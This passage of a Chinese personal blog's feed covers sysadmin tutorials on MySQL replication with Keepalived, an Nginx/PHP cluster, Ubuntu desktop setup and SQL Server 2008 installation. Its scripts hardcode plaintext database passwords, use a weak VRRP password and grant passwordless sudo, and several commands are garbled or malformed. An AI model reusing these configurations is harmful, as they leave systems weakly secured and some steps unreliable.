title="&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;"></a>&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;</h3><p><strong>&#x8FD9;&#x91CC;&#x5B8C;&#x6210;&#x4E5F;&#x624B;&#x52A8;&#x914D;&#x7F6E;&#x5427;&#x3002;&#x3002;&#x3002;</strong>  </p><pre><code class="bash">#!/bin/bash#mysql_replica.sh#mysql -uroot -p&quot;ccc.456&quot;#GRANT REPLICATION SLAVE ON *.* TO &apos;root&apos;@&apos;192.168.110.%&apos; IDENTIFIED BY &apos;ccc.456&apos;;#FLUSH PRIVILEGES;#quithost_bit=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1 | awk &apos; BEGIN{ FS=&quot;.&quot;} { print $4 }&apos;`# &#x6BCF;&#x53F0;MySQL&#x7684;server-id&#x7684;&#x503C;&#x4E0D;&#x80FD;&#x4E00;&#x6837;echo -e &quot;server-id=$host_bit\nlog_bin=mysql-bin\nquery_cache_type=OFF\nbinlog-ignore-db=performance_schema,mysql,sys&quot; &gt;&gt; /etc/my.cnfsystemctl restart mysqld</code></pre><h3 id="MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;"><a href="#MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;" class="headerlink" title="MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;"></a>MySQL&#x7684;Keepalived&#x9AD8;&#x53EF;&#x7528;</h3><pre><code class="bash">echo -e &quot;192.168.110.18\tserver18\n192.168.110.19\tserver19\n&quot; &gt;&gt; /etc/hostsyum install -y keepalivedmv /etc/keepalived/keepalived.conf /etc/keepalived/keepalived.confbak# KeepAlivedhost_bit=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1 | awk &apos; BEGIN{ FS=&quot;.&quot;} { print $4 }&apos;`cat &gt; /etc/keepalived/keepalived.conf &lt;&lt; EOF! Configuration File for keepalivedglobal_defs {    notification_email {        fnaichu@qq.com    }    ! server18&#x6539;&#x6210;&#x81EA;&#x5DF1;&#x7684;&#x4E3B;&#x673A;&#x540D;    notification_email_from keepalived@serverhost_bit    smtp_server 127.0.0.1    smtp_connect_timeout 30    ! server18&#x6539;&#x6210;&#x81EA;&#x5DF1;&#x7684;&#x4E3B;&#x673A;&#x540D;    router_id server$host_bit    vrrp_mcast_group5 225.5.5.5}    vrrp_script chk_proxy {        script &quot;/etc/keepalived/proxy_check.sh&quot;        interval 2        weight -2    }    vrrp_instance VI_1 {    state BACKUP    nopreempt    virtual_router_id 11    priority 100    advert_int 1    interface ens33    authentication {        auth_type PASS        auth_pass 1111    }    virtual_ipaddress {        192.168.110.20/24 dev ens33 label ens33:1    }    track_script {        chk_proxy    }    smtp_alert}EOFcat &gt; /etc/keepalived/proxy_check.sh &lt;&lt;EOFecho &gt; /etc/keepalived/proxy_check.sh &lt;&lt; EOF#!/bin/bashnetstat -nlpt | grep -w &quot;3306&quot; &amp;&gt;&gt; /dev/nullif [ $? -ne 0 ]then    systemctl stop keepalivedfiexit 0EOFchmod a+x /etc/keepalived/proxy_check.shsystemctl restart keepalived</code></pre><h2 id="&#x9879;&#x76EE;&#x4E0A;&#x7EBF;"><a href="#&#x9879;&#x76EE;&#x4E0A;&#x7EBF;" class="headerlink" title="&#x9879;&#x76EE;&#x4E0A;&#x7EBF;"></a>&#x9879;&#x76EE;&#x4E0A;&#x7EBF;</h2><pre><code class="bash">yum install -y unzipunzip Cloudreve_v1.0.3&#x4E91;&#x76D8;.zipssh root@192.168.110.18 &quot;mysql -uroot -p&quot;ccc.456&quot; -e &apos;create database cloud;&apos;&quot;sql_user=&quot;mysql -uroot -p&quot;ccc.456&quot; -e &apos;GRANT ALL ON cloud.* TO &quot;abc&quot;@&quot;192.168.110.%&quot; IDENTIFIED BY &quot;Abc.abc.1&quot;;&apos;&quot;ssh root@192.168.110.18 &quot;$sql_user&quot;chown -R nobody:nobody /webData/chmod u+w /webData/runtime/chmod u+w /webData/public/cp /webData/application/database_sample.php /webData/application/database.php</code></pre><h3 id="&#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;"><a href="#&#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;" class="headerlink" title="&#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;"></a>&#x4FEE;&#x6539;Nginx&#x4EE3;&#x7406;&#x914D;&#x7F6E;</h3><pre><code class="nginx">#cat /usr/local/nginx/conf/user/proxy.conf server {    listen       80;    server_name  www.uplookinglinux.com;    charset utf-8;    access_log  /usr/local/nginx/logs/proxy.access.log  main;    #################################################    fastcgi_connect_timeout 30;    fastcgi_send_timeout 30;    fastcgi_read_timeout 30;    fastcgi_buffer_size  64k;    fastcgi_buffers 4 64k;    fastcgi_busy_buffers_size 128k;    fastcgi_temp_file_write_size 128k;    #uri &#x5339;&#x914D; .php &#x6216;&#x8005; .php5 &#x7ED3;&#x5C3E;    location ~ \.(php|php5)$ {        root   /var/www/web;        #&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230; phpServer&#x96C6;&#x7FA4;        fastcgi_pass  phpServer;        fastcgi_index index.php;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        include   fastcgi_params;    }    #&#x5339;&#x914D;&#x6839;&#x76EE;&#x5F55;&#xFF0C;&#x56E0;&#x4E3A;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x4E3B;&#x9875;&#x4E3A;index.php&#x52A8;&#x6001;&#x9875;&#x9762;    location = / {        root   /var/www/web;        #&#x6307;&#x5B9A;&#x4EE3;&#x7406;&#x5230; phpServer&#x96C6;&#x7FA4;        fastcgi_pass  phpServer;        fastcgi_index index.php;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        include   fastcgi_params;    }    #################################################    location / {        #&#x8BBE;&#x7F6E;&#x4F2A;&#x9759;&#x6001;&#x8F6C;&#x53D1;&#x89C4;&#x5219;        if (!-e $request_filename) {            rewrite  ^(.*)$  /index.php?s=/$1  last;            break;        }        root   /var/www/web;        index  index.html index.htm;        proxy_pass http://webServer;        proxy_set_header X-Real-IP  $remote_addr;        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;        proxy_redirect off;        proxy_connect_timeout 30;        proxy_send_timeout 15;        proxy_read_timeout 15;    }}install -y nfs-utilsmkdir -p /var/www/webchown nobody:nobody /var/www/web/mount -tnfs 192.168.110.17:/webData /var/www/web/echo -e &quot;192.168.10.17:/webData\t/var/www/web\tnfs\tdefaults\t0 0&quot; &gt;&gt; /etc/fstabmount -a</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;9台机器IP地址分配（静态）：&lt;/strong&gt;：&lt;br&gt;&lt;code&gt;192.168.110.11&lt;/code&gt; —-&amp;gt; Nginx反向代理&lt;br&gt;&lt;code&gt;192.168.110.12&lt;/code&gt; —-&amp;gt; Nginx反向代理&lt;br&gt;&lt;code&gt;192.168.110.13&lt;/code&gt; —-&amp;gt; Nginx Server&lt;br&gt;&lt;code&gt;192.168.110.14&lt;/code&gt; —-&amp;gt; Nginx Server&lt;br&gt;&lt;code&gt;192.168.110.15&lt;/code&gt; —-&amp;gt; PHP 5.6&lt;br&gt;&lt;code&gt;192.168.110.16&lt;/code&gt; —-&amp;gt; PHP 5.6&lt;br&gt;&lt;code&gt;192.168.110.17&lt;/code&gt; —-&amp;gt; 存储服务&lt;br&gt;&lt;code&gt;192.168.110.18&lt;/code&gt; —-&amp;gt; MySQL&lt;br&gt;&lt;code&gt;192.168.110.19&lt;/code&gt; —-&amp;gt; MySQL &lt;/p&gt;
    
    </summary>
    
    
      <category term="LNMP" scheme="https://marnm.github.io/tags/LNMP/"/>
    
      <category term="Keepalived" scheme="https://marnm.github.io/tags/Keepalived/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu Desktop优化与配置</title>
    <link href="https://marnm.github.io//posts/e76ba468/"/>
    <id>https://marnm.github.io//posts/e76ba468/</id>
    <published>2021-11-10T07:23:44.000Z</published>
    <updated>2022-09-02T19:21:12.621Z</updated>
    
    <content type="html"><![CDATA[<h4 id="vmtools"><a href="#vmtools" class="headerlink" title="vmtools"></a>vmtools</h4><p>&#x5982;&#x679C;&#x5728;VMware&#x865A;&#x62DF;&#x673A;&#x91CC;&#x9762;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;open-vm-tools&#xFF0C;&#x8FD9;&#x662F;&#x539F;&#x6765;&#x7684;vmtools&#x901A;&#x8FC7;&#x5F00;&#x6E90;&#x51FA;&#x6765;&#x7684;&#x7248;&#x672C;&#x800C;&#x5DF2;</p><pre><code class="bash">sudo apt-get install open-vm-tools open-vm-tools-desktop</code></pre><a id="more"></a><h4 id="gnome-teawk-tool"><a href="#gnome-teawk-tool" class="headerlink" title="gnome-teawk-tool"></a>gnome-teawk-tool</h4><p>&#x5B89;&#x88C5;gnome-tweak&#x4FEE;&#x6539;DPI&#x3001;&#x4E3B;&#x9898;&#x3001;&#x56FE;&#x6807;</p><pre><code class="bash">sudo apt-get install gnome-tweak-tool</code></pre><h4 id="&#x5B89;&#x88C5;gnome&#x63D2;&#x4EF6;"><a href="#&#x5B89;&#x88C5;gnome&#x63D2;&#x4EF6;" class="headerlink" title="&#x5B89;&#x88C5;gnome&#x63D2;&#x4EF6;"></a>&#x5B89;&#x88C5;gnome&#x63D2;&#x4EF6;</h4><p>&#x63D2;&#x4EF6;&#x5730;&#x5740;<a href="https://extensions.gnome.org/" target="_blank" rel="noopener">URL</a>&#x3002;&#x8981;&#x4FEE;&#x6539;gnome-shell&#xFF0C;&#x8BB0;&#x5F97;&#x5148;&#x5B89;&#x88C5;User Themse&#x63D2;&#x4EF6;</p><p>Ubuntu &#x7684;&#x914D;&#x7F6E;<br>&#x4FEE;&#x6539;&#x955C;&#x50CF;&#x6E90;/etc/apt/source.list</p><pre><code class="bash">sudo apt-get updatesudo apt-get upgrade</code></pre><p>&#x8FDB;&#x5165;&#x8BBE;&#x7F6E;&#x9762;&#x677F;-&#x66F4;&#x65B0;&#x8F93;&#x5165;&#x6CD5;&#x914D;&#x7F6E;</p><p>&#x7F8E;&#x5316;<br><code>sudo apt install gnome-tweaks</code> &#x6216;<code></code>gnome-tweak-tool<code>&#x6D4F;&#x89C8;&#x5668;&#x63D2;&#x4EF6;</code>chrome-gnome-shell<code></code>User Themes<code>&#xFF0C;</code>Dash to Dock<code></code>gnome-shell-extensions<code>&#x5B89;&#x88C5;&#x4E3B;&#x9898;shell: .local/share/theme</code>&#x76EE;&#x5F55;&#x4E0B;<br>&#x56FE;&#x6807; .local/share/icons<br>&#x5B57;&#x4F53; .local/share/fonts</p><p>&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#xFF0C;&#x8FDB;&#x5165;&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;&#x5373;&#x53EF;<br>Google Chrome&#x3001;&#x641C;&#x72D7;&#x8F93;&#x5165;&#x6CD5;&#x3001;WPS</p><p>WPS&#x82E5;&#x6709;&#x5B57;&#x4F53;&#x7F3A;&#x5931;&#x95EE;&#x9898;<br>&#x4E0B;&#x8F7D;&#x7F3A;&#x5931;&#x5B57;&#x4F53;&#x6587;&#x4EF6;&#x5305;&#xFF0C;&#x89E3;&#x538B;&#x5230;<br><code>sudo mv * /usr/share/fonts</code><br>&#x751F;&#x6210;&#x5B57;&#x4F53;&#x7D22;&#x5F15;&#x4FE1;&#x606F;<br><code>sudo mkfontscale</code><br><code>sudo mkfontdir</code><br>&#x66F4;&#x65B0;&#x5B57;&#x4F53;&#x7F13;&#x5B58;<br><code>sudo fc-cache</code></p><p>&#x4E00;&#x4E9B;&#x5E38;&#x7528;&#x547D;&#x4EE4;&#x5DE5;&#x5177;<br>git&#x3001;curl&#x3001;net-tools&#x3001;vim&#x3001;emacs&#x3001;tree&#x3001;nmap</p><p>sudo&#x514D;&#x5BC6;&#x7801;(abc&#x662F;&#x7528;&#x6237;&#x540D;&#xFF09;</p><pre><code class="shell">sudo visudoabc ALL=(ALL) NOPASSWD: ALL</code></pre><p>&#x5F00;&#x53D1;&#x73AF;&#x5883;<br>JAVA<br>open-jdk:<br><code>apt install openjdk-8-jdk</code><br><code>apt install openjdk-8-source</code></p><p>oracle-jdk<br>&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;JDK<br><code>sudo tar -zxvf jdk-8-xxx.tar.gz -C /usr/</code><br>&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;</p><pre><code class="shell">cat &gt;&gt; ~/.bashrc &lt;&lt;- &quot;EOF&quot;export JAVA_HOME=/usr/jdk-xxxx...export PATH=$JAVA_HOME/bin/$PATHEOFsource ~/.bashrc</code></pre><p>Qv2ray&#x6838;&#x5FC3;&#x6587;&#x4EF6;&#x914D;&#x7F6E;<br>&#x7531;&#x4E8E;&#x67D0;&#x4E9B;&#x4F17;&#x6240;&#x5468;&#x77E5;&#x7684;&#x653F;&#x7B56;&#x539F;&#x56E0;&#xFF0C;Qv2ray &#x672C;&#x8EAB;&#x5E76; &#x4E0D;&#x5305;&#x542B; V2Ray &#x6838;&#x5FC3;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x4E9B;&#x6838;&#x5FC3;&#x6587;&#x4EF6;&#x6765;&#x81EA;&#x4E00;&#x4E2A;&#x53EB;&#x505A; v2ray-core &#x7684;&#x9879;&#x76EE;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x6237;&#x624B;&#x52A8;&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5230;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x3002;<br>&#x9879;&#x76EE;&#x5730;&#x5740;<a href="https://github.com/v2fly/v2ray-core/releases" target="_blank" rel="noopener">https://github.com/v2fly/v2ray-core/releases</a><br>&#x5C06;&#x89E3;&#x538B;&#x51FA;&#x6765;&#x7684;&#x6838;&#x5FC3;&#x6587;&#x4EF6;&#x653E;&#x5230;.config/qv2ray/vcore&#x4E0B;<br>v2ray | v2ctl | geoip.dat | geosite.dat &#xFF08;&#x8FD9;&#x51E0;&#x4E2A;&#x5FC5;&#x987B;&#xFF09;</p><p>&#x51FA;&#x73B0;&#x5F88;&#x591A;&#x547D;&#x4EE4;&#x4E22;&#x5931;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x547D;&#x4EE4;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;<br>&#x5728;/etc/profile&#x6216;&#x8005;.bashrc&#x6DFB;&#x52A0;</p><pre><code class="bash">export PATH=&quot;$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games&quot;source profile source .bashrc</code></pre><p>&#x7ED9;snap&#x8BBE;&#x7F6E;&#x4EE3;&#x7406;&#xFF0C;&#x6CE8;&#x610F;&#x5730;&#x5740;&#x4E0D;&#x80FD;&#x5E26;https<br>&#x542F;&#x52A8;vpn&#x540E;</p><pre><code class="bash">[user@lc]_ sudo snap set system proxy.http=&quot;http://&lt;proxy_addr&gt;:&lt;proxy_port&gt;&quot; [user@lc]_ sudo snap set system proxy.https=&quot;http://&lt;proxy_addr&gt;:&lt;proxy_port&gt;&quot;</code></pre><p>&#x4F8B;&#x5982;</p><pre><code class="bash">sudo snap set system proxy.http=&quot;http://127.0.0.1:8889&quot;sudo snap set system proxy.https=&quot;http:127.0.0.1:8889&quot;</code></pre><p>&#x5B89;&#x88C5;Pycharm<br><code>sudo tar -zxvf xxx.tar.gz -C /opt/</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;vmtools&quot;&gt;&lt;a href=&quot;#vmtools&quot; class=&quot;headerlink&quot; title=&quot;vmtools&quot;&gt;&lt;/a&gt;vmtools&lt;/h4&gt;&lt;p&gt;如果在VMware虚拟机里面，可以用open-vm-tools，这是原来的vmtools通过开源出来的版本而已&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;sudo apt-get install open-vm-tools open-vm-tools-desktop
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SQL Server 2008安装配置</title>
    <link href="https://marnm.github.io//posts/c45f2736/"/>
    <id>https://marnm.github.io//posts/c45f2736/</id>
    <published>2021-03-25T11:08:40.000Z</published>
    <updated>2022-05-27T01:38:48.225Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x7CFB;&#x7EDF;&#x8981;&#x6C42;"><a href="#&#x7CFB;&#x7EDF;&#x8981;&#x6C42;" class="headerlink" title="&#x7CFB;&#x7EDF;&#x8981;&#x6C42;"></a>&#x7CFB;&#x7EDF;&#x8981;&#x6C42;</h3><p>&#x5B98;&#x7F51;&#x7684;&#x6700;&#x4F4E;&#x8981;&#x6C42;</p><p><img src="../img/sqlsrv2008_system-requirements.png" alt="SQL Server 2008 System Requirements"><br><a id="more"></a></p><h3 id="&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;"><a href="#&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;" class="headerlink" title="&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;"></a>&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;</h3><!--more--><p><img src="D:\Settings\library\Document\article\install.png" alt="Install Check"></p><p><img src="D:\Settings\library\Document\article\enter_key.png" alt="Enter Key"></p><p><img src="D:\Settings\library\Document\article\accept_license.png" alt="Accept License"></p><p><img src="D:\Settings\library\Document\article\click_install.png" alt="Click Install"></p><p><img src="D:\Settings\library\Document\article\next_step.png" alt="Next Step"></p><p><img src="D:\Settings\library\Document\article\default.png" alt="Default Select All"></p><p><img src="D:\Settings\library\Document\article\defaultID.png" alt="Default"></p><p><img src="D:\Settings\library\Document\article\server_config.png" alt="Server Config"></p><p>&#x8FD9;&#x91CC;&#x53EF;&#x9009;&#x62E9;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x3010;Windows&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x6A21;&#x5F0F;&#x3011;&#xFF0C;&#x7136;&#x540E;&#x3010;&#x6DFB;&#x52A0;&#x5F53;&#x524D;&#x7528;&#x6237;&#x3011;&#x4E3A;&#x7BA1;&#x7406;&#x5458;&#xFF1A;</p><p><img src="D:\Settings\library\Document\article\sqlengine_conf.png" alt="SQL Server Engine Config"></p><p><img src="D:\Settings\library\Document\article\Analysis_Services.png" alt="Analysis Server Configure"></p><p>&#x540E;&#x9762;&#x7684;&#x57FA;&#x672C;&#x5168;&#x90E8;&#x9ED8;&#x8BA4;&#x3010;&#x4E0B;&#x4E00;&#x6B65;&#x3011;&#xFF0C;&#x7B49;&#x5F85;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#xFF1A;</p><p><img src="D:\Settings\library\Document\article\installing.png" alt="Install"></p><p><img src="D:\Settings\library\Document\article\Installed.png" alt="Installed"></p><h3 id="&#x914D;&#x7F6E;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;"><a href="#&#x914D;&#x7F6E;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;" class="headerlink" title="&#x914D;&#x7F6E;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;"></a>&#x914D;&#x7F6E;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;</h3><p>&#x6253;&#x5F00;&#x6570;&#x636E;&#x5E93;&#x5C5E;&#x6027;&#xFF1A;</p><p><img src="D:\Settings\library\Document\article\remote1.png" alt=""></p><p><img src="D:\Settings\library\Document\article\remote2.png" alt="Security"></p><p><img src="D:\Settings\library\Document\article\remote3.png" alt="Enable Connection"></p><p><img src="D:\Settings\library\Document\article\remote4.png" alt="Enable TCP/IP"></p><p>&#x5982;&#x679C;Windows&#x542F;&#x7528;&#x4E86;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x8BF7;&#x5141;&#x8BB8;<code>1433</code>&#x7AEF;&#x53E3;&#x51FA;&#x5165;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;系统要求&quot;&gt;&lt;a href=&quot;#系统要求&quot; class=&quot;headerlink&quot; title=&quot;系统要求&quot;&gt;&lt;/a&gt;系统要求&lt;/h3&gt;&lt;p&gt;官网的最低要求&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../img/sqlsrv2008_system-requirements.png&quot; alt=&quot;SQL Server 2008 System Requirements&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="SQL Server" scheme="https://marnm.github.io/tags/SQL-Server/"/>
    
  </entry>
  
  <entry>
    <title>计算机概述</title>
    <link href="https://marnm.github.io//posts/217dc297/"/>
    <id>https://marnm.github.io//posts/217dc297/</id>
    <published>2020-10-24T13:39:04.000Z</published>
    <updated>2022-05-27T01:37:50.116Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x8BA1;&#x7B97;&#x673A;&#x6982;&#x8FF0;"><a href="#&#x8BA1;&#x7B97;&#x673A;&#x6982;&#x8FF0;" class="headerlink" title="&#x8BA1;&#x7B97;&#x673A;&#x6982;&#x8FF0;"></a>&#x8BA1;&#x7B97;&#x673A;&#x6982;&#x8FF0;</h2><blockquote><p>&#x4ECA;&#x5929;1024&#xFF0C;&#x6D45;&#x8C08;&#x4EE5;&#x4E0B;&#x8BA1;&#x7B97;&#x673A;&#x5386;&#x53F2;&#x2026;.</p></blockquote><h3 id="&#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x5C55;&#x7684;&#x5386;&#x53F2;"><a href="#&#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x5C55;&#x7684;&#x5386;&#x53F2;" class="headerlink" title="&#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x5C55;&#x7684;&#x5386;&#x53F2;"></a>&#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x5C55;&#x7684;&#x5386;&#x53F2;</h3><p>&#x81EA;&#x53E4;&#x4EE5;&#x6765;&#x4EBA;&#x7C7B;&#x5C31;&#x5728;&#x4E0D;&#x65AD;&#x5730;&#x53D1;&#x660E;&#x548C;&#x6539;&#x8FDB;&#x8BA1;&#x7B97;&#x5DE5;&#x5177;&#xFF0C;&#x4ECE;&#x7ED3;&#x7EF3;&#x8BA1;&#x6570;&#x5230;&#x7B97;&#x76D8;&#xFF0C;&#x8BA1;&#x7B97;&#x5C3A;&#xFF0C;&#x624B;&#x6447;&#x8BA1;&#x7B97;&#x673A;&#xFF0C;&#x76F4;&#x5230;1946&#x5E74;&#x7B2C;&#x4E00;&#x53F0;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x8BDE;&#x751F;&#xFF0C;&#x867D;&#x7136;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x81F3;&#x4ECA;&#x867D;&#x7136;&#x53EA;&#x6709;&#x77ED;&#x77ED;&#x7684;&#x534A;&#x4E2A;&#x591A;&#x4E16;&#x7EAA;&#xFF0C;&#x4F46;&#x53D6;&#x5F97;&#x4E86;&#x60CA;&#x4EBA;&#x7684;&#x53D1;&#x5C55;&#x5417;&#xFF0C;&#x5DF2;&#x7ECF;&#x7ECF;&#x5386;&#x4E86;&#x4E94;&#x4EE3;&#x7684;&#x53D8;&#x9769;&#x3002;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x53D1;&#x5C55;&#x548C;&#x7535;&#x5B50;&#x6280;&#x672F;&#x7684;&#x53D1;&#x5C55;&#x5BC6;&#x5207;&#x76F8;&#x5173;&#xFF0C;&#x6545;&#x6BCF;&#x6B21;&#x7535;&#x5B50;&#x6280;&#x672F;&#x6709;&#x7A81;&#x7834;&#x6027;&#x7684;&#x53D1;&#x5C55;&#xFF0C;&#x5C31;&#x4F1A;&#x5BFC;&#x81F4;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x4E00;&#x6B21;&#x91CD;&#x5927;&#x53D8;&#x9769;&#x3002;&#x6240;&#x4EE5;&#x8BA1;&#x7B97;&#x673A;&#x53D1;&#x5C55;&#x53F2;&#x4E2D;&#x7684; &#x2018;&#x2019;&#x4EE3;&#x2018;&#x2019; &#x901A;&#x5E38;&#x4EE5;&#x5176;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x4E3B;&#x8981;&#x5668;&#x4EF6;&#x6765;&#x5212;&#x5206;&#x7684;&#xFF08;&#x7535;&#x5B50;&#x7BA1;&#xFF0C;&#x6676;&#x4F53;&#x7BA1;&#xFF0C;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#xFF0C;&#x5927;&#x89C4;&#x6A21;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#xFF0C;&#x8D85;&#x5927;&#x89C4;&#x6A21;&#x96C6;&#x6210;&#x7535;&#x8DEF;&#xFF09;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x5404;&#x4E2A;&#x9636;&#x6BB5;&#x6240;&#x914D;&#x7F6E;&#x7684;&#x8F6F;&#x4EF6;&#x548C;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#x4E5F;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x7279;&#x70B9;&#xFF0C;&#x6210;&#x4E3A;&#x5212;&#x5206; &#x201C;&#x4EE3;&#x201D; &#x7684;&#x6807;&#x5FD7;&#x4E4B;&#x4E00;&#x3002;<br><a id="more"></a><br><strong>1&#xFF1A;&#x7B2C;&#x4E00;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#xFF08;1946-1957&#xFF09;</strong></p><p>&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x65E9;&#x671F;&#x7814;&#x7A76;&#x662F;&#x4ECE;20&#x4E16;&#x7EAA;30&#x5E74;&#x4EE3;&#x672B;&#x5F00;&#x59CB;&#x7684;&#x3002;&#x82F1;&#x56FD;&#x6570;&#x5B66;&#x5BB6; &#x827E;&#x4F26;&#x25AA;&#x56FE;&#x7075; &#x5728;&#x4E00;&#x7BC7;&#x8BBA;&#x6587;&#x4E2D;&#x63CF;&#x8FF0;&#x4E86;&#x901A;&#x7528;&#x8BA1;&#x7B97;&#x673A;&#x5E94;&#x5177;&#x6709;&#x7684;&#x5168;&#x90E8;&#x529F;&#x80FD;&#x53CA;&#x5176;&#x5C40;&#x9650;&#x6027;&#xFF0C;&#x8FD9;&#x79CD;&#x673A;&#x5668;&#x88AB;&#x6210;&#x4E3A;&#x56FE;&#x7075;&#x673A;&#x3002;&#xFF08;&#x4E16;&#x754C;&#x7B2C;&#x4E00;&#x53F0;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A; ENIAC &#x5728;1946&#x5E74;&#x8BDE;&#x751F;&#x4E8E;&#x7F8E;&#x56FD;&#x5BBE;&#x5915;&#x6CD5;&#x5C3C;&#x4E9A;&#x5927;&#x5B66;&#xFF0C;&#x4F46;&#x5B66;&#x672F;&#x754C;&#x516C;&#x8BA4;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x7406;&#x8BBA;&#x548C;&#x6A21;&#x578B;&#x662F;&#x7531;&#x82F1;&#x56FD;&#x6570;&#x5B66;&#x5BB6;&#x56FE;&#x7075;&#x5728;&#x6B64;10&#x5E74;&#x524D;&#x53D1;&#x8868;&#x7684;&#x4E00;&#x7BC7;&#x8BBA;&#x6587;&#x300A;&#x8BBA;&#x53EF;&#x8BA1;&#x7B97;&#x6570;&#x53CA;&#x5176;&#x5728;&#x5224;&#x5B9A;&#x95EE;&#x9898;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x300B;&#x4E2D;&#x5960;&#x5B9A;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x7F8E;&#x56FD;&#x8BA1;&#x7B97;&#x673A;&#x534F;&#x4F1A;&#x5728;1966&#x5E74;&#x7EAA;&#x5FF5;&#x7535;&#x5B50;&#x8BA1;&#x7B97;&#x673A;&#x8BDE;&#x751F;20&#x5468;&#x5E74;&#x65F6;&#xFF0C;&#x8BBE;&#x7ACB;&#x4E86;&#x8BA1;&#x7B97;&#x673A;&#x754C;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5956;&#x9879; &#x201C;&#x56FE;&#x7075;&#x5956;&#x201D; 